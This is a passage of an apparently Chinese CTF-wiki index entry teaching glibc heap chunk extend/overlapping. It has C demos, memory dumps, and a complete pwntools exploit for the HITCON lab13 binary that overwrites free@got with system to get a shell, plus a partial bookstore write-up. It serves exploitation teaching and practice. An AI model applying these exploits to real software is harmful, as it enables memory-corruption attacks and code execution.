0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 \u6b64\u65f6\u518d\u8fdb\u884c malloc \u5206\u914d\u5c31\u53ef\u4ee5\u5f97\u5230 chunk1+chunk2 \u7684\u5806\u5757\uff0c\u4ece\u800c\u63a7\u5236\u4e86chunk2 \u7684\u5185\u5bb9\u3002 Chunk Extend/Shrink \u53ef\u4ee5\u505a\u4ec0\u4e48 \u00b6 \u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u79cd\u6280\u672f\u5e76\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4f46\u662f\u53ef\u4ee5\u63a7\u5236chunk\u4e2d\u7684\u5185\u5bb9\u3002\u5982\u679c chunk \u5b58\u5728\u5b57\u7b26\u4e32\u6307\u9488\u3001\u51fd\u6570\u6307\u9488\u7b49\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6307\u9488\u6765\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f\u548c\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002 \u6b64\u5916\u901a\u8fc7extend\u53ef\u4ee5\u5b9e\u73b0chunk overlapping\uff0c\u901a\u8fc7overlapping\u53ef\u4ee5\u63a7\u5236chunk\u7684fd/bk\u6307\u9488\u4ece\u800c\u53ef\u4ee5\u5b9e\u73b0 fastbin attack \u7b49\u5229\u7528\u3002 \u57fa\u672c\u793a\u4f8b4\uff1a\u901a\u8fc7extend\u540e\u5411overlapping \u00b6 \u8fd9\u91cc\u5c55\u793a\u901a\u8fc7extend\u8fdb\u884c\u540e\u5411overlapping\uff0c\u8fd9\u4e5f\u662f\u5728CTF\u4e2d\u6700\u5e38\u51fa\u73b0\u7684\u60c5\u51b5\uff0c\u901a\u8fc7overlapping\u53ef\u4ee5\u5b9e\u73b0\u5176\u5b83\u7684\u4e00\u4e9b\u5229\u7528\u3002 int main() { void *ptr,*ptr1; ptr=malloc(0x10);//\u5206\u914d\u7b2c1\u4e2a 0x80 \u7684chunk1 malloc(0x10); //\u5206\u914d\u7b2c2\u4e2a 0x10 \u7684chunk2 malloc(0x10); //\u5206\u914d\u7b2c3\u4e2a 0x10 \u7684chunk3 malloc(0x10); //\u5206\u914d\u7b2c4\u4e2a 0x10 \u7684chunk4 *(int *)((int)ptr-0x8)=0x61; free(ptr); ptr1=malloc(0x50); } \u5728malloc(0x50)\u5bf9extend\u533a\u57df\u91cd\u65b0\u5360\u4f4d\u540e\uff0c\u5176\u4e2d0x10\u7684fastbin\u5757\u4f9d\u7136\u53ef\u4ee5\u6b63\u5e38\u7684\u5206\u914d\u548c\u91ca\u653e\uff0c\u6b64\u65f6\u5df2\u7ecf\u6784\u6210overlapping\uff0c\u901a\u8fc7\u5bf9overlapping\u7684\u8fdb\u884c\u64cd\u4f5c\u53ef\u4ee5\u5b9e\u73b0fastbin attack\u3002 \u57fa\u672c\u793a\u4f8b5\uff1a\u901a\u8fc7extend\u524d\u5411overlapping \u00b6 \u8fd9\u91cc\u5c55\u793a\u901a\u8fc7\u4fee\u6539pre_inuse\u57df\u548cpre_size\u57df\u5b9e\u73b0\u5408\u5e76\u524d\u9762\u7684\u5757 int main(void) { void *ptr1,*ptr2,*ptr3,*ptr4; ptr1=malloc(128);//smallbin1 ptr2=malloc(0x10);//fastbin1 ptr3=malloc(0x10);//fastbin2 ptr4=malloc(128);//smallbin2 malloc(0x10);//\u9632\u6b62\u4e0etop\u5408\u5e76 free(ptr1); *(int *)((long long)ptr4-0x8)=0x90;//\u4fee\u6539pre_inuse\u57df *(int *)((long long)ptr4-0x10)=0xd0;//\u4fee\u6539pre_size\u57df free(ptr4);//unlink\u8fdb\u884c\u524d\u5411extend malloc(0x150);//\u5360\u4f4d\u5757 } \u524d\u5411extend\u5229\u7528\u4e86smallbin\u7684unlink\u673a\u5236\uff0c\u901a\u8fc7\u4fee\u6539pre_size\u57df\u53ef\u4ee5\u8de8\u8d8a\u591a\u4e2achunk\u8fdb\u884c\u5408\u5e76\u5b9e\u73b0overlapping\u3002 HITCON Trainging lab13 \u00b6 \u57fa\u672c\u4fe1\u606f \u00b6 \u279c hitcontraning_lab13 git: ( master ) file heapcreator heapcreator: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped \u279c hitcontraning_lab13 git: ( master ) checksec heapcreator [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u7a0b\u5e8f\u4e3a 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u5668\uff0c\u6bcf\u4e2a\u5806\u4e3b\u8981\u6709\u4e24\u4e2a\u6210\u5458\uff1a\u5927\u5c0f\u4e0e\u5185\u5bb9\u6307\u9488\u3002\u4e3b\u8981\u529f\u80fd\u5982\u4e0b \u521b\u5efa\u5806\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u7533\u8bf7\u5bf9\u5e94\u5185\u5b58\u7a7a\u95f4\uff0c\u5e76\u5229\u7528 read \u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u3002\u8fd9\u91cc\u957f\u5ea6\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u957f\u5ea6\u4e3a\u8d1f\u6570\u65f6\uff0c\u4f1a\u51fa\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\u5f53\u7136\uff0c\u524d\u63d0\u662f\u53ef\u4ee5\u8fdb\u884c malloc\u3002\u6b64\u5916\uff0c\u8fd9\u91cc\u8bfb\u53d6\u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002 \u7f16\u8f91\u5806\uff0c\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u4ee5\u53ca\u4e4b\u524d\u5b58\u50a8\u7684\u5806\u7684\u5927\u5c0f\u8bfb\u53d6\u6307\u5b9a\u5185\u5bb9\uff0c\u4f46\u662f\u8fd9\u91cc\u8bfb\u5165\u7684\u957f\u5ea6\u4f1a\u6bd4\u4e4b\u524d\u5927 1\uff0c\u6240\u4ee5\u4f1a \u5b58\u5728 off by one \u7684\u6f0f\u6d1e \u3002 \u5c55\u793a\u5806\uff0c\u8f93\u51fa\u6307\u5b9a\u7d22\u5f15\u5806\u7684\u5927\u5c0f\u4ee5\u53ca\u5185\u5bb9\u3002 \u5220\u9664\u5806\uff0c\u5220\u9664\u6307\u5b9a\u5806\uff0c\u5e76\u4e14\u5c06\u5bf9\u5e94\u6307\u9488\u8bbe\u7f6e\u4e3a\u4e86 NULL\u3002 \u5229\u7528 \u00b6 \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528off by one \u6f0f\u6d1e\u8986\u76d6\u4e0b\u4e00\u4e2achunk \u7684 size \u5b57\u6bb5\uff0c\u4ece\u800c\u6784\u9020\u4f2a\u9020\u7684 chunk \u5927\u5c0f\u3002 \u7533\u8bf7\u4f2a\u9020\u7684 chunk \u5927\u5c0f\uff0c\u4ece\u800c\u4ea7\u751f chunk overlap\uff0c\u8fdb\u800c\u4fee\u6539\u5173\u952e\u6307\u9488\u3002 \u66f4\u52a0\u5177\u4f53\u7684\u8fd8\u662f\u76f4\u63a5\u770b\u811a\u672c\u5427\u3002 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './heapcreator' ) heap = ELF ( './heapcreator' ) libc = ELF ( './libc.so.6' ) def create ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def edit ( idx , content ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) r . recvuntil ( \":\" ) r . sendline ( content ) def show ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) def delete ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"4\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) free_got = 0x602018 create ( 0x18 , \"dada\" ) # 0 create ( 0x10 , \"ddaa\" ) # 1 # overwrite heap 1's struct's size to 0x41 edit ( 0 , \"/bin/sh \\x00 \" + \"a\" * 0x10 + \" \\x41 \" ) # trigger heap 1's struct to fastbin 0x40 # heap 1's content to fastbin 0x20 delete ( 1 ) # new heap 1's struct will point to old heap 1's content, size 0x20 # new heap 1's content will point to old heap 1's struct, size 0x30 # that is to say we can overwrite new heap 1's struct # here we overwrite its heap content pointer to free@got create ( 0x30 , p64 ( 0 ) * 4 + p64 ( 0x30 ) + p64 ( heap . got [ 'free' ])) #1 # leak freeaddr show ( 1 ) r . recvuntil ( \"Content : \" ) data = r . recvuntil ( \"Done !\" ) free_addr = u64 ( data . split ( \" \\n \" )[ 0 ] . ljust ( 8 , \" \\x00 \" )) libc_base = free_addr - libc . symbols [ 'free' ] log . success ( 'libc base addr: ' + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] #gdb.attach(r) # overwrite free@got with system addr edit ( 1 , p64 ( system_addr )) # trigger system(\"/bin/sh\") delete ( 0 ) r . interactive () 2015 hacklu bookstore \u00b6 \u57fa\u672c\u4fe1\u606f \u00b6 \u279c 2015_hacklu_bookstore git: ( master ) file books books: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 3a15f5a8e83e55c535d220473fa76c314d26b124, stripped \u279c 2015_hacklu_bookstore git: ( master ) checksec books [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\u8be5\u7a0b\u5e8f\u662f\u52a8\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4e0e NX \u4fdd\u62a4\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u8be5\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u662f\u8ba2\u4e66\uff0c\u5177\u4f53\u5982\u4e0b \u6700\u591a\u53ef\u4ee5\u8ba2\u8d2d\u4e24\u672c\u4e66\u3002 \u6839\u636e\u7f16\u53f7\u6765\u9009\u62e9\u8ba2\u8d2d\u7b2c\u51e0\u672c\u4e66\uff0c\u53ef\u4ee5\u4e3a\u6bcf\u672c\u4e66\u6dfb\u52a0\u5bf9\u5e94\u7684\u540d\u5b57\u3002\u7136\u800c\u5728\u6dfb\u52a0\u540d\u5b57\u5904\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002 \u6839\u636e\u7f16\u53f7\u6765\u5220\u9664 order\uff0c\u4f46\u662f\u8fd9\u91cc\u53ea\u662f\u5355\u7eaf\u5730 free \u6389\uff0c\u5e76\u6ca1\u6709\u7f6e\u4e3a NULL\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 use after free \u7684\u6f0f\u6d1e\u3002 \u63d0\u4ea4\u8ba2\u5355\uff0c\u5c06\u4e24\u672c\u4e66\u7684\u540d\u5b57\u5408\u5728\u4e00\u8d77\u3002\u8fd9\u91cc\u7531\u4e8e\u4e0a\u9762\u5806\u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u8fd9\u91cc\u4e5f\u4f1a\u51fa\u73b0\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002 \u6b64\u5916\uff0c\u5728\u7a0b\u5e8f\u9000\u51fa\u4e4b\u524d\u5b58\u5728\u4e00\u4e2a \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u3002 \u8fd9\u91cc\u867d\u7136\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u80fd\u529b\u5f88\u5f3a\uff0c\u4f46\u662f\u6240\u6709\u8fdb\u884c malloc \u7684\u5927\u5c0f\u90fd\u662f\u5b8c\u5168\u56fa\u5b9a\u7684\uff0c\u6211\u4eec\u53ea\u80fd\u501f\u52a9\u8fd9\u4e9b\u5206\u914d\u7684 chunk \u6765\u8fdb\u884c\u64cd\u4f5c\u3002 \u5229\u7528\u601d\u8def \u00b6 \u7a0b\u5e8f\u4e2d\u4e3b\u8981\u7684\u6f0f\u6d1e\u5728\u4e8e\u5806\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u4f46\u662f\u5982\u679c\u60f3\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u5fc5\u7136\u9700\u8981\u6ea2\u51fa\u5bf9\u5e94\u7684dest \u6570\u7ec4\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b \u5229\u7528\u5806\u6ea2\u51fa\u8fdb\u884c chunk extend\uff0c\u4f7f\u5f97\u5728 submit \u4e2d malloc(0x140uLL) \u65f6\uff0c\u6070\u597d\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8ba2\u5355\u5904\u7684\u4f4d\u7f6e\u3002\u5728 submit \u4e4b\u524d\uff0c\u5e03\u7f6e\u597d\u5806\u5185\u5b58\u5e03\u5c40\uff0c\u4f7f\u5f97\u628a\u5b57\u7b26\u4e32\u62fc\u63a5\u540e\u6070\u597d\u53ef\u4ee5\u8986\u76d6 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3002 \u901a\u8fc7\u6784\u9020 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a\u4e00\u65b9\u9762\u6cc4\u6f0f __libc_start_main_ret \u7684\u5730\u5740\uff0c \u4e00\u65b9\u9762\u63a7\u5236\u7a0b\u5e8f\u91cd\u65b0\u8fd4\u56de\u6267\u884c \u3002\u8fd9\u65f6\uff0c\u4fbf\u53ef\u4ee5\u77e5\u9053 libc \u57fa\u5730\u5740\uff0csystem \u7b49\u5730\u5740\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u7531\u4e8e\u4e00\u65e6 submit \u4e4b\u540e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u76f4\u63a5\u9000\u51fa\uff0c\u6240\u4ee5\u6211\u4eec\u6bd4\u8f83\u597d\u7684\u601d\u8def\u5c31\u662f\u4fee\u6539 fini_array \u4e2d\u7684\u53d8\u91cf\uff0c\u4ee5\u4fbf\u4e8e\u8fbe\u5230\u7a0b\u5e8f\u6267\u884c\u5b8c\u6bd5\u540e\uff0c \u91cd\u65b0\u8fd4\u56de\u6211\u4eec\u671f\u5f85\u7684\u4f4d\u7f6e \u3002\u8fd9\u91cc\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e2atrick\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u8bfb\u53d6\u9009\u62e9\u7684\u65f6\u5019\u4f1a\u8bfb\u53d6 128 \u5927\u5c0f\uff0c\u5728\u6808\u4e0a\u3002\u800c\u7a0b\u5e8f\u6700\u540e\u5728\u8f93\u51fa dest \u7684\u65f6\u5019\uff0c\u4e4b\u524d\u6240\u8bfb\u53d6\u7684\u90a3\u90e8\u5206\u9009\u62e9\u5fc5\u7136\u662f\u5728\u6808\u4e0a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5982\u679c\u6211\u4eec\u5728\u6808\u4e0a\u9884\u5148\u5e03\u7f6e\u597d\u4e00\u4e9b\u63a7\u5236\u6d41\u6307\u9488\uff0c\u90a3\u5c31\u53ef\u4ee5\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u518d\u6b21\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u8986\u76d6 free@got \u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u8fbe\u5230\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\u3002 \u8fd9\u91cc\uff0c\u5404\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u662f Fini_array0 : 5+8=13 __libc_start_main_ret : 5+0x1a=31\u3002 00:0000\u2502 rsp 0x7ffe6a7f3ec8 \u2014\u25b8 0x400c93 \u25c2\u2014 mov eax, 0 01:0008\u2502 0x7ffe6a7f3ed0 \u25c2\u2014 0x100000000 02:0010\u2502 0x7ffe6a7f3ed8 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ('Order 1:') 03:0018\u2502 0x7ffe6a7f3ee0 \u2014\u25b8 0x400d38 \u25c2\u2014 pop rcx 04:0020\u2502 0x7ffe6a7f3ee8 \u2014\u25b8 0x9f2010 \u25c2\u2014 0x6666666666667325 ('%sffffff') 05:0028\u2502 0x7ffe6a7f3ef0 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ('Order 1:') 06:0030\u2502 0x7ffe6a7f3ef8 \u2014\u25b8 0x9f2130 \u25c2\u2014 0x6564724f203a3220 (' 2: Orde') 07:0038\u2502 0x7ffe6a7f3f00 \u25c2\u2014 0xa35 /* '5\\n' */ 08:0040\u2502 0x7ffe6a7f3f08 \u25c2\u2014 0x0 ... \u2193 0b:0058\u2502 0x7ffe6a7f3f20 \u25c2\u2014 0xff00000000000000 0c:0060\u2502 0x7ffe6a7f3f28 \u25c2\u2014 0x0 ... \u2193 0f:0078\u2502 0x7ffe6a7f3f40 \u25c2\u2014 0x5f5f00656d697474 /* 'ttime' */ 10:0080\u2502 0x7ffe6a7f3f48 \u25c2\u2014 0x7465675f6f736476 ('vdso_get') 11:0088\u2502 0x7ffe6a7f3f50 \u25c2\u2014 0x1 12:0090\u2502 0x7ffe6a7f3f58 \u2014\u25b8 0x400cfd \u25c2\u2014 add rbx, 1 13:0098\u2502 0x7ffe6a7f3f60 \u25c2\u2014 0x0 ... \u2193 15:00a8\u2502 0x7ffe6a7f3f70 \u2014\u25b8 0x400cb0 \u25c2\u2014 push r15 16:00b0\u2502 0x7ffe6a7f3f78 \u2014\u25b8 0x400780 \u25c2\u2014 xor ebp, ebp 17:00b8\u2502 0x7ffe6a7f3f80 \u2014\u25b8 0x7ffe6a7f4070 \u25c2\u2014 0x1 18:00c0\u2502 0x7ffe6a7f3f88 \u25c2\u2014 0xd8d379f22453ff00 19:00c8\u2502 rbp 0x7ffe6a7f3f90 \u2014\u25b8 0x400cb0 \u25c2\u2014 push r15 1a:00d0\u2502 0x7ffe6a7f3f98 \u2014\u25b8 0x7f9db2113830 (__libc_start_main+240) \u25c2\u2014 mov edi, eax \uff01\uff01\uff01\u5f85\u8865\u5145\uff01\uff01\uff01 \u9898\u76ee \u00b6 2016 Nuit du Hack CTF Quals : night deamonic heap","title":"Chunk Extend / Overlapping"},{"location":"pwn/heap/chunk_extend_overlapping/#chunk-extend-and-overlapping","text":"","title":"Chunk Extend and Overlapping"},{"location":"pwn/heap/chunk_extend_overlapping/#_1","text":"chunk extend\u662f\u5806\u6f0f\u6d1e\u7684\u4e00\u79cd\u5e38\u89c1\u5229\u7528\u624b\u6cd5\uff0c\u901a\u8fc7extend\u53ef\u4ee5\u5b9e\u73b0chunk overlapping\u7684\u6548\u679c\u3002\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u9700\u8981\u4ee5\u4e0b\u7684\u65f6\u673a\u548c\u6761\u4ef6\uff1a \u7a0b\u5e8f\u4e2d\u5b58\u5728\u57fa\u4e8e\u5806\u7684\u6f0f\u6d1e \u6f0f\u6d1e\u53ef\u4ee5\u63a7\u5236 chunk header \u4e2d\u7684\u6570\u636e","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/chunk_extend_overlapping/#_2","text":"chunk extend\u6280\u672f\u80fd\u591f\u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8eptmalloc\u5728\u5bf9\u5806chunk\u8fdb\u884c\u64cd\u4f5c\u65f6\u4f7f\u7528\u7684\u5404\u79cd\u5b8f\u3002 \u5728ptmalloc\u4e2d\uff0c\u83b7\u53d6 chunk \u5757\u5927\u5c0f\u7684\u64cd\u4f5c\u5982\u4e0b /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) \u4e00\u79cd\u662f\u76f4\u63a5\u83b7\u53d6 chunk \u7684\u5927\u5c0f\uff0c\u4e0d\u5ffd\u7565\u63a9\u7801\u90e8\u5206\uff0c\u53e6\u5916\u4e00\u79cd\u662f\u5ffd\u7565\u63a9\u7801\u90e8\u5206\u3002 \u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u4e0b\u4e00 chunk \u5757\u5730\u5740\u7684\u64cd\u4f5c\u5982\u4e0b /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \u5373\u4f7f\u7528\u5f53\u524d\u5757\u6307\u9488\u52a0\u4e0a\u5f53\u524d\u5757\u5927\u5c0f\u3002 \u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u524d\u4e00\u4e2a chunk \u4fe1\u606f\u7684\u64cd\u4f5c\u5982\u4e0b /* Size of the chunk below P. Only valid if prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \u5373\u901a\u8fc7malloc_chunk->prev_size\u83b7\u53d6\u524d\u4e00\u5757\u5927\u5c0f\uff0c\u7136\u540e\u4f7f\u7528\u672c chunk \u5730\u5740\u51cf\u53bb\u6240\u5f97\u5927\u5c0f\u3002 \u5728 ptmalloc\uff0c\u5224\u65ad\u5f53\u524d chunk \u662f\u5426\u662fuse\u72b6\u6001\u7684\u64cd\u4f5c\u5982\u4e0b\uff1a #define inuse(p) ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE) \u5373\u67e5\u770b\u4e0b\u4e00 chunk \u7684 prev_inuse \u57df\uff0c\u800c\u4e0b\u4e00\u5757\u5730\u5740\u53c8\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\u662f\u6839\u636e\u5f53\u524d chunk \u7684 size \u8ba1\u7b97\u5f97\u51fa\u7684\u3002 \u66f4\u591a\u7684\u64cd\u4f5c\u8be6\u89c1 \u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784 \u4e00\u8282\u3002 \u901a\u8fc7\u4e0a\u9762\u51e0\u4e2a\u5b8f\u53ef\u4ee5\u770b\u51fa\uff0cptmalloc\u901a\u8fc7chunk header\u7684\u6570\u636e\u5224\u65adchunk\u7684\u4f7f\u7528\u60c5\u51b5\u548c\u5bf9chunk\u7684\u524d\u540e\u5757\u8fdb\u884c\u5b9a\u4f4d\u3002\u7b80\u800c\u8a00\u4e4b\uff0cchunk extend\u5c31\u662f\u901a\u8fc7\u63a7\u5236size\u548cpre_size\u57df\u6765\u5b9e\u73b0\u8de8\u8d8a\u5757\u64cd\u4f5c\u4ece\u800c\u5bfc\u81f4overlapping\u7684\u3002 \u4e0echunk extend\u7c7b\u4f3c\u7684\u8fd8\u6709\u4e00\u79cd\u79f0\u4e3achunk shrink\u7684\u64cd\u4f5c\u3002\u8fd9\u91cc\u53ea\u4ecb\u7ecdchunk extend\u7684\u5229\u7528\u3002","title":"\u539f\u7406"},{"location":"pwn/heap/chunk_extend_overlapping/#1inusefastbinextend","text":"\u7b80\u5355\u6765\u8bf4\uff0c\u8be5\u5229\u7528\u7684\u6548\u679c\u662f\u901a\u8fc7\u66f4\u6539\u7b2c\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u6765\u63a7\u5236\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\u3002 \u6ce8\u610f\uff0c\u6211\u4eec\u7684\u793a\u4f8b\u90fd\u662f\u572864\u4f4d\u7684\u7a0b\u5e8f\u3002\u5982\u679c\u60f3\u572832\u4f4d\u4e0b\u8fdb\u884c\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u628a8\u5b57\u8282\u504f\u79fb\u6539\u4e3a4\u5b57\u8282 \u3002 int main(void) { void *ptr,*ptr1; ptr=malloc(0x10);//\u5206\u914d\u7b2c\u4e00\u4e2a0x10\u7684chunk malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk *(long long *)((long long)ptr-0x8)=0x41;// \u4fee\u6539\u7b2c\u4e00\u4e2a\u5757\u7684size\u57df free(ptr); ptr1=malloc(0x30);// \u5b9e\u73b0 extend\uff0c\u63a7\u5236\u4e86\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9 return 0; } \u5f53\u4e24\u4e2amalloc\u8bed\u53e5\u6267\u884c\u4e4b\u540e\uff0c\u5806\u7684\u5185\u5b58\u5206\u5e03\u5982\u4e0b 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <=== chunk 2 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 <=== top chunk \u4e4b\u540e\uff0c\u6211\u4eec\u628a chunk1 \u7684 size \u57df\u66f4\u6539\u4e3a 0x41\uff0c0x41 \u662f\u56e0\u4e3a chunk \u7684 size \u57df\u5305\u542b\u4e86\u7528\u6237\u63a7\u5236\u7684\u5927\u5c0f\u548c header \u7684\u5927\u5c0f\u3002\u5982\u4e0a\u6240\u793a\u6b63\u597d\u5927\u5c0f\u4e3a0x40\u3002\u5728\u9898\u76ee\u4e2d\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7531\u5806\u6ea2\u51fa\u5f97\u5230\u3002 0x602000: 0x0000000000000000 0x0000000000000041 <=== \u7be1\u6539\u5927\u5c0f 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 \u6267\u884c free \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 chunk2 \u4e0e chunk1 \u5408\u6210\u4e00\u4e2a 0x40 \u5927\u5c0f\u7684 chunk\uff0c\u4e00\u8d77\u91ca\u653e\u4e86\u3002 Fastbins[idx=0, size=0x10] 0x00 Fastbins[idx=1, size=0x20] 0x00 Fastbins[idx=2, size=0x30] \u2190 Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) Fastbins[idx=3, size=0x40] 0x00 Fastbins[idx=4, size=0x50] 0x00 Fastbins[idx=5, size=0x60] 0x00 Fastbins[idx=6, size=0x70] 0x00 \u4e4b\u540e\u6211\u4eec\u901a\u8fc7 malloc(0x30) \u5f97\u5230 chunk1+chunk2 \u7684\u5757\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236chunk2\u4e2d\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u4e5f\u628a\u8fd9\u79cd\u72b6\u6001\u79f0\u4e3a overlapping chunk\u3002 call 0x400450 <malloc@plt> mov QWORD PTR [rbp-0x8], rax rax = 0x602010","title":"\u57fa\u672c\u793a\u4f8b1\uff1a\u5bf9inuse\u7684fastbin\u8fdb\u884cextend"},{"location":"pwn/heap/chunk_extend_overlapping/#2inusesmallbinextend","text":"\u901a\u8fc7\u4e4b\u524d\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5f97\u77e5\u5904\u4e8e fastbin \u8303\u56f4\u7684 chunk \u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u5165 fastbin \u94fe\u8868\u4e2d\uff0c\u800c\u4e0d\u5904\u4e8e\u8fd9\u4e2a\u8303\u56f4\u7684 chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u94fe\u8868\u4e2d\u3002 \u4ee5\u4e0b\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 0x80 